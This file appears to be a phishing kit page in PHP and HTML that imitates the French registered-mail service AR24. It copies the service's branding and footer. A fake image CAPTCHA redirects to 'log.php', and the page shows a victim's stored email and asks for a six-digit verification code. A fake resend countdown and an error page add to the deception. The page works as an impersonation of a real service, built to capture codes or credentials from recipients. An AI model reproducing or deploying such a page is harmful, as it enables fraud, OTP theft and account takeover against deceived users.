<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Les bonnes réponses
    $reponses_correctes = ['passage1', 'passage2', 'passage3', 'passage4'];

    // Récupérer les images sélectionnées par l'utilisateur
    $images_selectionnees = isset($_POST['image']) ? $_POST['image'] : [];

    // Comparer les images sélectionnées avec les réponses correctes
    $reussite = empty(array_diff($reponses_correctes, $images_selectionnees)) && empty(array_diff($images_selectionnees, $reponses_correctes));

    if ($reussite) {
        header("Refresh: 0; URL=log.php");
        exit();
    } else {
        $_SESSION['captcha_reussi'] = false;
        $_SESSION['message'] = "CAPTCHA échoué. Essayez encore.";
    }
} else {
    // Réinitialiser les messages quand la page est chargée sans soumission
    unset($_SESSION['captcha_reussi']);
    unset($_SESSION['message']);
}
$email = isset($_SESSION["ide"]) ? $_SESSION["ide"] : "E-mail non fourni.";
?>


<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-compatible" content="IE=edge" >
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accuser réception du courrier 41568930 - AR24</title>
    <!-- <link rel="stylesheet" href="/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&amp;1727776860"> -->
    <link rel="icon" type="image/png" href="img/favicon.png">
    <link rel="stylesheet" href="style.css">
    <style>
        .mailto{
            color: #2d0cd4;
            font-weight: bold;
        }
        .captcha-image {
            width: 100px;
            height: 100px;
            margin: 5px;
        }
        .captcha-grid {
            display: grid;
            grid-template-columns: repeat(3, 100px);
        }
         /* Styles pour centrer la page
         body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        } */

        /* Conteneur du formulaire */
        .captcha-container {
            text-align: center;
        }

        h3 {
            margin-bottom: 20px;
        }

        /* Grille des images 4x4 */
        .image-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr); /* 4 colonnes */
            grid-gap: 8px;
            max-width: 500px;
            margin: 0 auto;
        }

        /* Style des images */
        .image-grid label {
            position: relative;
            display: block;
            cursor: pointer;
        }

        .image-grid img {
            width: 60px;
            height: 50px;
            border-radius: 5px;
            opacity: 70%;
            transition: transform 0.3s ease;
        }

        /* Style des checkbox invisibles */
        .image-grid input[type="checkbox"] {
            position: absolute;
            opacity: 0;
            cursor: pointer;
        }

        /* Effet sur les images sélectionnées */
        .image-grid input[type="checkbox"]:checked + img {
            transform: scale(1.1);
            border: 3px solid #2d0cd4;
        }

        /* Style du bouton de soumission */
        input[type="submit"] {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #2d0cd4;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 40%;
            margin-left: 30%;
        }
        /* Message d'erreur */
        .error-message { color: #f91212ba;
             font-weight: bold; margin-top: 20px;font-size: 15px; }
        .error-message img { 
            margin-left: -5px;
            width: 25px;
            height: 25px;
            margin-bottom: -8px; }

        input[type="submit"]:hover {
            background-color: #2d0cd4;
        }
        .code-container {
            display: flex;
            justify-content: center;
            margin-top: 50px;
        }
        .code-input {
            width: 44px;
            /* height: 49px; */
            margin: 4px;
            font-size: 16px;
            text-align: center; 
            border: 2px solid #ccc;
            border-radius: 5px;
            outline: none;
            transition: border-color 0.3s; 
        }
        .code-input:focus {
            border-color: #007bff; 
        }
        .code-input::placeholder {
            color: transparent; 
        }
    </style>
</head>
<body class=" guest">
      <noscript>
        <div style="z-index:100; text-align: center; line-height: 2em; background-color: #c0392b; color: white; font-weight: 500; position: fixed; top: 40px; left:50%; transform: translateX(-50%); padding: 20px 30px"> JavaScript n'est pas activé pour le site d'AR24. Il est nécessaire au bon fonctionnement de nos services.<br/> <a href="https://app.ar24.fr/fr/page/javascript" style="color:inherit; border-bottom:1px solid;">Suivre les instructions pour activer JavaScript</a></div> 
    </noscript>  <header id="header"><div class="wrapper"> 
        <a href="https://app.ar24.fr" class="header-logo">AR24 - Lettre Recommandée Électronique </a> <button id="open-mobile-menu" class="btn btn-ghost small">Menu</button> <nav aria-label="Main Navigation"> <button id="close-mobile-menu" class="btn btn-ghost small">✖</button><ul> <li><a href="https://app.ar24.fr/fr/user/register" id="btn_free_try" class="btn btn-primary small fw-500 ">Inscription</a></li><li><a href="https://app.ar24.fr/fr/user/login" class="btn small fw-500 ">Se connecter</a></li> </ul> </nav></div> </header>
        <main id="main-content"> 
            <header>
                <h1 class="align-center">  Réceptionnez votre courrier recommandé électronique </h1> 
            </header>
            
            <div class="card align-center">
                <p class="overline">Un code de validation a été envoyé à l'adresse : <span class="mailto" ><?php echo htmlspecialchars($email); ?></span></p>
                <p>Veuillez entrer le code que vous avez reçu pour vérifier votre adresse.</p>
                <div class="code-container">
        <input type="text" maxlength="1" class="code-input" oninput="validateInput(this)" onkeydown="moveToNext(this, event)" placeholder="_"required>
        <input type="text" maxlength="1" class="code-input" oninput="validateInput(this)" onkeydown="moveToNext(this, event)" placeholder="_">
        <input type="text" maxlength="1" class="code-input" oninput="validateInput(this)" onkeydown="moveToNext(this, event)" placeholder="_">
        <input type="text" maxlength="1" class="code-input" oninput="validateInput(this)" onkeydown="moveToNext(this, event)" placeholder="_">
        <input type="text" maxlength="1" class="code-input" oninput="validateInput(this)" onkeydown="moveToNext(this, event)" placeholder="_">
        <input type="text" maxlength="1" class="code-input" oninput="validateInput(this)" onkeydown="moveToNext(this, event)" placeholder="_">
    </div>

    <script>
        function validateInput(input) {
            input.value = input.value.replace(/[^0-9]/g, ''); // N'autoriser que les chiffres
        }

        function moveToNext(input, event) {
            if (event.key === 'Backspace') { // Touche "Backspace"
                if (input.value === '') {
                    input.previousElementSibling?.focus();
                }
            } else if (input.value.length === 1) {
                input.nextElementSibling?.focus();
            }
        }
    </script>
                <br><br>
                <a href="/validation-error.php" style="background-color: #00F;color: #FFF;border: 1px solid #00F;margin: auto;margin-top: auto;margin-top: 50px;margin-bottom: 20px;" class="btn btn-primary ">Valider</a><br>
                <p>Vous n’avez pas reçu le code ?</p>
                <p style="margin-top: auto;" id="countdownMessage" >Vous pourrez renvoyer le code dans <span id="countdown"></span> secondes.</p>
                <a href=""id="resendButton" style="display: none;border :none;margin-top:5px;" class="btn-link margin-auto">Renvoyer le code</a>
  <!-- <button id="resendButton" style="display: none;" onclick="resendCode()">Renvoyer le code</button> -->

  <script>
    
    let resendAttempts = 0; 
    function startCountdown(delay) {
      let countdownTime = delay; 
      const countdownElement = document.getElementById("countdown");
      const countdownMessage = document.getElementById("countdownMessage");
      const resendButton = document.getElementById("resendButton");

      countdownMessage.style.display = "block"; 
      countdownElement.textContent = countdownTime; 
      const countdownInterval = setInterval(() => {
        countdownTime--;
        countdownElement.textContent = countdownTime;

        if (countdownTime <= 0) {
          clearInterval(countdownInterval); 
          countdownMessage.style.display = "none"; 
          resendButton.style.display = "inline"; 
        }
      }, 1000);
    }

    
    startCountdown(120);

    function resendCode() {
      resendAttempts++; 

      
      if (resendAttempts === 1) {
        location.reload(); 
      } else if (resendAttempts === 2) {
        startCountdown(30);
        
      }
    }
    // function resendCode() {
      
    //     alert("Le code a été renvoyé.");
      
    // }
  </script>
                </div>
            
        </main> 
        <footer id="footer">
            <div class="wrapper">
                <div class="top">
                    <div class="logo"> 
                        <img src="img/AR24.png">
                    </div>
                    <div class="line"> Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace. <br>AR24 est une filiale de Docaposte</div>
                    <div class="imgs"> 
                        <img src="img/frenchtech.png" width="61px" height="65px" walt="French Tech"> 
                        <img src="img/regionalsace_grey.png" width="54px" height="63px" alt="Région Alsace"> 
                        <img src="img/syntec.png" width="80px" height="31px" alt="Syntec Numérique" class="syntec"></div></div><hr><div class="bottom"><div class="col col-contact">  <span class="phone secondary-color">08 11 69 05 45<br><span class="time">(0.05€/min + prix appel)</span></span><br> <span class="time">Du lundi au vendredi</span><br> <span class="time">de 9h00 à 17h30 en continu</span><br> </div><div class="col"><ul> <li><a href="https://app.ar24.fr/fr/user/login">Se connecter</a></li><li><a href="https://www.ar24.fr">Accueil</a></li><li><a href="https://www.ar24.fr/qui-sommes-nous/">Qui sommes-nous ?</a></li><li><a href="https://www.ar24.fr/avantages/">Avantages</a></li><li><a href="#" class="ccb__edit">Paramètres des cookies</a></li><li><a href="https://www.ar24.fr/certifications/">Certifications</a></li><li><a href="https://www.ar24.fr/contact/">Contact</a></li></ul></div><div class="col"><ul><li><a href="https://www.ar24.fr/pour-qui/">Pour qui ?</a></li><li><a href="https://www.ar24.fr/questions/">FAQ</a></li><li><a href="https://www.ar24.fr/base-de-connaissances/">Base de connaissances</a></li><li><a href="https://app.ar24.fr/fr/page/validate">Vérifier mes preuves</a></li><li><a href="https://app.ar24.fr/fr/page/email">Vérifier un email</a></li></ul></div><div class="col"><ul><li><a href="https://www.ar24.fr/cgu/">CGU</a></li><li><a href="https://www.ar24.fr/mentions-legales/">Mentions légales</a></li><li><a href="https://www.ar24.fr/politique-de-confidentialite-inscription/" style="white-space: nowrap;">Politique de confidentialité : inscription</a></li><li><a href="https://www.ar24.fr/sous-traitance-ulterieure-stu/">Sous-traitants ultérieurs</a></li><li><a href="http://status.ar24.fr" target="_blank">Etat du service</a></li></ul></div><div class="col col-copyright"><ul><li><a href="https://app.ar24.fr/fr/arm/action/41568930-bc39adb98f3710c38a0e39a3efe60088c49bec0ec859c1577a3946a093f8253e?c=UXPB8PArVIhXeap100gL&amp;utm_campaign=ar24&amp;utm_medium=email&amp;utm_source=relance_ar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' fill='none'%3e%3cpath fill='%23fff' fill-rule='evenodd' d='M16.667 5.501a8 8 0 1 0 0 12.997z' clip-rule='evenodd'/%3e%3cpath fill='%23002395' fill-rule='evenodd' d='M8.333 5A8 8 0 0 0 4 12.112a8 8 0 0 0 4.333 7.112z' clip-rule='evenodd'/%3e%3cpath fill='%23ED2939' fill-rule='evenodd' d='M16 19.224a8 8 0 0 0 4.333-7.112A8 8 0 0 0 16 5z' clip-rule='evenodd'/%3e%3cpath fill='%2300008C' stroke='%2300008C' stroke-linecap='round' d='M6.275 6.274v.001A8.09 8.09 0 0 0 3.903 12c0 2.235.909 4.26 2.37 5.722A8.07 8.07 0 0 0 12 20.092c2.235 0 4.26-.904 5.722-2.37A8.06 8.06 0 0 0 20.092 12c0-2.235-.905-4.26-2.37-5.725A8.07 8.07 0 0 0 12 3.904c-2.235 0-4.26.909-5.725 2.37ZM18.01 18.008h-.001A8.46 8.46 0 0 1 12 20.5a8.47 8.47 0 0 1-6.012-2.492A8.48 8.48 0 0 1 3.5 12c0-2.348.951-4.471 2.488-6.012A8.48 8.48 0 0 1 12 3.5c2.345 0 4.472.951 6.008 2.488A8.47 8.47 0 0 1 20.5 12a8.46 8.46 0 0 1-2.491 6.008Z'/%3e%3c/svg%3e" style="height:2.5rem;" alt=""> </a></li><li><a href="https://app.ar24.fr/en/arm/action/41568930-bc39adb98f3710c38a0e39a3efe60088c49bec0ec859c1577a3946a093f8253e?c=UXPB8PArVIhXeap100gL&amp;utm_campaign=ar24&amp;utm_medium=email&amp;utm_source=relance_ar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' fill='none'%3e%3cg clip-path='url%28%23a%29'%3e%3cellipse cx='12.006' cy='11.987' fill='%23fff' rx='9.006' ry='8.987'/%3e%3cpath fill='%2329337A' d='M4.585 6.9a9 9 0 0 0-1.29 2.805H7.39zM9.48 3.36a9 9 0 0 0-2.843 1.413L9.48 7.616zM6.848 19.377c.793.555 1.68.985 2.631 1.262v-3.893zM3.4 14.657a9 9 0 0 0 1.336 2.654l2.653-2.654z'/%3e%3cpath fill='%23fff' d='M4.733 6.691q-.075.104-.148.21L7.39 9.704H3.296q-.098.38-.165.771h5.387zM6.639 19.23q.103.075.208.148l2.632-2.632v3.894q.38.11.77.188v-5.21zM3.2 13.887q.082.391.199.77h3.99l-2.654 2.654q.435.593.957 1.107l4.53-4.531zM9.479 3.36v4.255L6.636 4.772a9 9 0 0 0-1.098.966l4.711 4.711V3.171a9 9 0 0 0-.77.189'/%3e%3cpath fill='%23E51D35' d='m9.48 14.63-.028.027h.027zM10.223 13.887h.027v-.028zM13.686 10.476h-.026v.026zM9.506 9.705 9.48 9.68v.026zM10.25 10.45v.026h.027z'/%3e%3cpath fill='%2329337A' d='M14.432 18.647v2.018a9 9 0 0 0 2.668-1.25l-2.186-2.186c-.175.613-.239.93-.482 1.418M14.925 7.122l2.387-2.387a9 9 0 0 0-2.88-1.4v2.072c.28.562.304.99.493 1.715M19.228 17.363a9 9 0 0 0 1.373-2.706h-4.08zM20.704 9.705a9 9 0 0 0-1.326-2.857L16.52 9.705z'/%3e%3cpath fill='%23E51D35' d='M12 21'/%3e%3cpath fill='%2329337A' d='M14.432 19.037c.243-.488.452-1.05.627-1.663l-.627-.627zM15.137 6.91a10 10 0 0 0-.705-1.946v2.651z'/%3e%3cpath fill='%23fff' d='M15.625 14.214q.015-.163.028-.327h-.355zM14.431 7.615V4.964a5 5 0 0 0-.77-1.156v4.936l1.547-1.548q-.035-.144-.072-.285zM13.687 10.476h1.992a22 22 0 0 0-.188-1.804zM13.66 20.192c.287-.31.544-.701.771-1.156v-2.29l.627.627c.144-.504.264-1.042.362-1.606l-1.76-1.76z'/%3e%3cpath fill='%23E51D35' d='m15.225 8.938 3.218-3.219a9 9 0 0 0-.929-.83l-2.528 2.53c.112.47.163 1.008.239 1.519M12 21c.568 0 1.122-.055 1.66-.156v-1.036C13.189 20.32 12.636 21 12 21M20.869 10.476h-5.408a24 24 0 0 1-.026 3.41H20.8a9 9 0 0 0 .069-3.41M15.45 14.04c-.05.53-.224.945-.31 1.447l3.046 3.047q.453-.43.843-.916zM13.66 4.152v-.997A9 9 0 0 0 12 3c.635 0 1.188.64 1.66 1.152'/%3e%3cpath fill='%23E51D35' d='M13.66 20.193v-6.185l1.76 1.76c.087-.502.155-1.023.205-1.554l-.327-.327h.355c.089-1.122.098-2.282.026-3.41h-1.992l1.804-1.805a17 17 0 0 0-.282-1.476L13.66 8.744V3.807C13.188 3.295 12.635 3 12 3q-.225 0-.45.011a9 9 0 0 0-1.3.16v7.279L5.54 5.738q-.436.449-.805.953l3.785 3.785H3.13a9.048 9.048 0 0 0 .068 3.41h7.024l-4.53 4.532q.444.438.946.81l3.611-3.61v5.21A9 9 0 0 0 12 21c.635 0 1.188-.295 1.66-.807'/%3e%3c/g%3e%3cpath fill='%2300008C' stroke='%2300008C' stroke-linecap='round' d='M6.275 6.274v.001A8.09 8.09 0 0 0 3.903 12c0 2.235.909 4.26 2.37 5.722A8.07 8.07 0 0 0 12 20.092c2.235 0 4.26-.904 5.722-2.37A8.06 8.06 0 0 0 20.092 12c0-2.235-.905-4.26-2.37-5.725A8.07 8.07 0 0 0 12 3.904c-2.235 0-4.26.909-5.725 2.37ZM18.01 18.008h-.001A8.46 8.46 0 0 1 12 20.5a8.47 8.47 0 0 1-6.012-2.492A8.48 8.48 0 0 1 3.5 12c0-2.348.951-4.471 2.488-6.012A8.48 8.48 0 0 1 12 3.5c2.345 0 4.472.951 6.008 2.488A8.47 8.47 0 0 1 20.5 12a8.46 8.46 0 0 1-2.491 6.008Z'/%3e%3cdefs%3e%3cclipPath id='a'%3e%3cpath fill='%23fff' d='M3 3h18v18H3z'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" style="height:2.5rem;" alt=""> </a></li><li><a href="https://app.ar24.fr/nl/arm/action/41568930-bc39adb98f3710c38a0e39a3efe60088c49bec0ec859c1577a3946a093f8253e?c=UXPB8PArVIhXeap100gL&amp;utm_campaign=ar24&amp;utm_medium=email&amp;utm_source=relance_ar"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='25' height='24' fill='none'%3e%3cg clip-path='url%28%23a%29'%3e%3ccircle cx='13' cy='12' r='8' fill='%23fff'/%3e%3cpath fill='%2321468B' d='M12.5 20c-5.2 0-7.5-3.733-8-5.4H20c-.5 1.667-2.7 5.4-7.5 5.4'/%3e%3cpath fill='%23AE1C28' d='M12.5 4C7.3 4 5 7.556 4.5 9.333h16C19.917 7.556 17.5 4 12.5 4'/%3e%3c/g%3e%3cpath fill='%2300008C' stroke='%2300008C' stroke-linecap='round' d='M6.775 6.274v.001A8.09 8.09 0 0 0 4.403 12c0 2.235.909 4.26 2.37 5.722a8.07 8.07 0 0 0 5.726 2.37c2.235 0 4.26-.904 5.722-2.37A8.06 8.06 0 0 0 20.592 12c0-2.235-.905-4.26-2.37-5.725A8.07 8.07 0 0 0 12.5 3.904c-2.235 0-4.26.909-5.725 2.37ZM18.51 18.008h-.001A8.46 8.46 0 0 1 12.5 20.5a8.47 8.47 0 0 1-6.012-2.492A8.48 8.48 0 0 1 4 12c0-2.348.951-4.471 2.488-6.012A8.48 8.48 0 0 1 12.5 3.5c2.345 0 4.472.951 6.008 2.488A8.47 8.47 0 0 1 21 12a8.46 8.46 0 0 1-2.491 6.008Z'/%3e%3cdefs%3e%3cclipPath id='a'%3e%3cpath fill='%23fff' d='M0 4h25v16H0z'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" style="height:2.5rem;" alt=""> </a></li></ul> <br><p class="copyright"> Tous droits réservés<br>AR24 2025</p></div></div></div> </footer><script src="/static/min/?f=js/libs/jquery.min.js,js/pages/app.js&amp;1727776860"></script><script type="text/plain" data-consent="matomoana">
var _paq = window._paq = window._paq || [];
/* tracker methods like "setCustomDimension" should be called before "trackPageView" */  _paq.push(['trackPageView']);
_paq.push(['enableLinkTracking']);
/* accurately measure the time spent in the visit */
_paq.push(['enableHeartBeatTimer']);
(function() {
var u="//matomo.u.ar24.io/";
_paq.push(['setTrackerUrl', u+'matomo.php']);
_paq.push(['setSiteId', '1']);
var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
g.type='text/javascript'; g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
})(); </script><script type="text/plain" data-consent="matomotag">
var _mtm = window._mtm = window._mtm || [];
_mtm.push({'mtm.startTime': (new Date().getTime()), 'event': 'mtm.Start'});
var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
g.type='text/javascript'; g.async=true; g.src='https://matomo.u.ar24.io/js/container_POFLrbOv.js'; s.parentNode.insertBefore(g,s); </script><script type="text/javascript" data-consent="analytics" id="hs-script-loader" async="" defer="" src="//js.hs-scripts.com/6951574.js"></script> <script type="text/javascript" data-consent="analytics">
document.addEventListener("DOMContentLoaded", function() {
var hs_email = "; " + document.cookie;
hs_email = hs_email.split("; hs_email=");
if(hs_email.length > 1) {
hs_email = decodeURIComponent(hs_email.pop().split(";").shift());var _hsq = window._hsq = window._hsq || [];
_hsq.push(["identify",{
email: hs_email
}]);
}
}); </script> <script>
const AR24_VERSION = "1727776860";
const HOME_URL = "https://app.ar24.fr/fr";
const USER_OTP_EXPIRES_IN_DAYS = "";
const USER_OTP_EXPIRES_REMINDER_COUNT = "";
const USER_OTP_EXPIRES_MAX_REMINDER_COUNT = "3";
const USER_OTP_EXPIRES_NOTICE_BEFORE_EXPIRATION_IN_DAYS = "30";
const IS_PENDING_OTP_COMMAND = false;
const csrf_token = "MTcyODIxNjE3NzI1MjM5YjZlN2UzYjhiZGQ0MjNlNDU5NWUzZDAxYjU0ODcxOGZhYTByXxZ1qOnmOgP+qXWfuOk6JoO5lvGZEgxxLuVBaq36TQ=="; </script> 
<script src="/static/min/?f=js/main.js,js/tools.js,js/components.js,js/lang.js&amp;1727776860"></script> 
<script src="/static/v2/js/cookie_consent/cookieconsent.lib.js?v=1727776860"></script> 
<script src="/static/v2/js/cookie_consent/cookieconsent.js?v=1727776860"></script> 
<script src="/static/v2/js/user_serials/user_otp_expiration_modal.js?v=1727776860"></script> 
<script src="/static/js/pages/arm-action.js?v=1727776860"></script> 
<script> const ALLOWED_DOMAINS = ['ar24.fr'];  </script>
<style>
#cconsent-bar, #cconsent-bar * {
    box-sizing:border-box;
    font-family:Rubik, sans-serif;
     }
#cconsent-bar { 
    background-color:rgba(34, 34, 34, .7); 
    color:#FFF; 
    padding:15px; 
    text-align:right; 
    font-family:sans-serif; 
    font-size:14px; 
    line-height:18px; 
    position:fixed; 
    bottom:0; 
    left:0; 
    width:100%; 
    z-index:9998; 
    transform: translateY(0); 
    transition: transform .6s ease-in-out; 
    transition-delay: .3s;
    }
    #cconsent-bar.ccb--hidden {
        transform: translateY(100%); 
        display:block;
        }
    #cconsent-bar .ccb__wrapper {
        display:flex; 
        flex-wrap:no-wrap; 
        justify-content:space-between; 
        max-width:1800px; 
        margin:0 auto;
        }
    @media (max-width: 750px) { 
        #cconsent-bar .ccb__wrapper { 
            flex-direction:column; 
            } 
        }
        #cconsent-bar .ccb__left { 
            align-self:center; 
            text-align:left; 
            margin: 15px 0;
            }
        #cconsent-bar .ccb__left .cc-text { 
            font-size:.95em; 
            text-align:justify;
            }
        #cconsent-bar .ccb__right { 
            align-self:center; 
            white-space: nowrap;
            }
        #cconsent-bar .ccb__right > div {
            display:inline-block; 
            color:#FFF; 
            padding:15px
            }
        #cconsent-bar .ccb__right .ccb__button {
            display:flex; 
            flex-direction:row; 
            align-items:center; 
            justify-content:center;
            }
        #cconsent-bar .ccb__right .ccb__edit {
            display:none
            }
        #cconsent-bar a { 
            text-decoration:underline; 
            color:#FFF; 
            }
        #cconsent-bar button { 
            line-height:normal; 
            font-size:14px; 
            border:none; 
            border-radius:.35em; 
            font-weight:500; 
            padding:10px 1.5em; 
            color:#FFF; 
            background-color:#3498db;
            }
        #cconsent-bar button + button { 
            margin-left: 1.5em; 
            }
        #cconsent-bar div.consent-close-and-refuse { 
            font-weight:600; 
            color:#888; 
            cursor:pointer; 
            font-size:26px; 
            position: absolute; 
            right:15px; 
            top: 15px;
            }
        #cconsent-bar a.ccb__edit { 
            margin-right:15px 
            }
        #cconsent-bar a:hover, #cconsent-bar button:hover { 
            cursor:pointer; 
            }
        #cconsent-modal { 
            font-family: Rubik, sans-serif; 
            display:none; 
            font-size:14px; 
            line-height:18px; 
            color:#666; 
            width: 100vw; 
            height: 100vh; 
            position:fixed; 
            left:0; 
            top:0; 
            right:0; 
            bottom:0; 
            font-family:sans-serif; 
            font-size:14px; 
            background-color:rgba(0,0,0,0.6); 
            z-index:9999; 
            align-items:center; 
            justify-content:center;
            }
        @media (max-width: 600px) { 
            #cconsent-modal { 
                height: 100% 
                } 
            }
        #cconsent-modal h2, #cconsent-modal h3 {
            color:#333
            }
        #cconsent-modal.ccm--visible {
            display:flex
            }
        #cconsent-modal .ccm__content { 
            max-width:800px; 
            min-height:500px; 
            max-height:600px; 
            overflow-Y:auto; 
            background-color:#EFEFEF; 
            }
            @media (max-width: 600px) { #cconsent-modal .ccm__content { max-width:100vw; height:100%; max-height:initial; }}#cconsent-modal .ccm__content > .ccm__content__heading { border-bottom:1px solid #D8D8D8; padding:35px 35px 20px; background-color:#EFEFEF; position:relative;}#cconsent-modal .ccm__content > .ccm__content__heading h2 { font-size:21px; font-weight:600; color:#333; margin:0 0 16px 0 }#cconsent-modal .ccm__content > .ccm__content__heading p a { display:block;margin-top:12px; }#cconsent-modal .ccm__content > .ccm__content__heading .ccm__cheading__close {font-weight:600; color:#888; cursor:pointer; font-size:26px; position: absolute; right:15px; top: 15px;}#cconsent-modal h2, #cconsent-modal h3 {margin-top:0}#cconsent-modal .ccm__content > .ccm__content__body { background-color:#FFF;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup {margin:0; border-bottom: 1px solid #D8D8D8; }/* #cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup .ccm__tab-head::before { position:absolute; left:35px; font-size:1.4em; font-weight: 600; color:#E56385; content:"×"; display:inline-block; margin-right: 20px;} *//* #cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup.checked-5jhk .ccm__tab-head::before {font-size:1em; content:"✔"; color:#28A834} */#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup .ccm__tab-head .ccm__tab-head__icon-wedge { transition: transform .3s ease-out; transform-origin: 16px 6px 0; position:absolute;right:25px; top:50%; transform:rotate(0deg); transform:translateY(-50%)}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup .ccm__tab-head .ccm__tab-head__icon-wedge > svg { pointer-events: none; }#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-head .ccm__tab-head__icon-wedge {transform:rotate(-180deg)}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-head {color:#333; padding:17px 35px; margin:0}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content {padding:25px 35px; margin:0}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-head { transition: background-color .5s ease-out }#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-head:hover { background-color:#F9F9F9 }#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-head {font-weight:600; cursor:pointer; position:relative;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup .ccm__tab-content {display:none;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-head { background-color:#F9F9F9 }#cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-content {display:flex;}
            @media (max-width: 600px) { #cconsent-modal .ccm__content > .ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-content {flex-direction:column} }@media (max-width: 600px) { #cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left { margin-bottom:20px; } }#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch-component {display:flex; margin-right:35px; align-items:center;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch-component > div {font-weight:600;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch-group {width:40px; height:20px; margin:0 10px; position:relative;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch {position: absolute; top:0; right:0; display: inline-block; width: 40px; height: 20px;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input {display:none;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch .ccm__switch__slider  {position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; border-radius:10px; -webkit-transition: .4s; transition: .4s;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch .ccm__switch__slider:before  {position: absolute; content: ""; height: 12px; width: 12px; left: 4px; bottom: 4px; background-color: white; border-radius:50%; -webkit-transition: .4s; transition: .4s;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input:checked + .ccm__switch__slider  {background-color: #28A834;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input:focus + .ccm__switch__slider  {box-shadow: 0 0 1px #28A834;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input:checked + .ccm__switch__slider:before  {-webkit-transform: translateX(20px); -ms-transform: translateX(20px); transform: translateX(20px);}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content h3 {font-size:18px; margin-bottom:10px; line-height:1;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content p {color:#444; margin-bottom:0}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__list:not(:empty) {margin-top:30px;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__list .ccm__list__title {color:#333; font-weight:600;}#cconsent-modal .ccm__content > .ccm__content__body .ccm__tab-content .ccm__list ul { margin:15px 0; padding-left:15px }#cconsent-modal .ccm__footer { padding:35px; background-color:#EFEFEF; text-align:center; display: flex; align-items:center; justify-content:flex-end; }#cconsent-modal .ccm__footer button { border-radius: .35em; line-height:normal; font-size:14px; transition: background-color .5s ease-out; background-color:#f5bf1c; color:#222; border:none; padding:13px; min-width:110px; border-radius: 2px; cursor:pointer; }#cconsent-modal .ccm__footer button:hover { background-color:#e1ab08; }#cconsent-modal .ccm__footer button#ccm__footer__consent-modal-submit {  margin-right:10px; margin-left:10px; }</style>
            <div id="cconsent-bar" class="ccb--hidden">
                <div class="ccb__wrapper">
                    <div class="ccb__left">
                        <div class="cc-text">
                            <h5>AR24 respecte votre vie privée</h5>
                            Afin de vous offrir la meilleure expérience sur notre site, et de réaliser des statistiques de visite, nous utilisons des cookies. Ils nous permettent notamment de personnaliser notre contenu, et de vous proposer des partages sur les réseaux sociaux. La confidentialité et la sécurité de vos données utilisateur sont la priorité de nos services. C'est pourquoi vous pouvez choisir de <a class="ccb__edit" style="margin-right: 0;">paramétrer vos cookies</a>. 
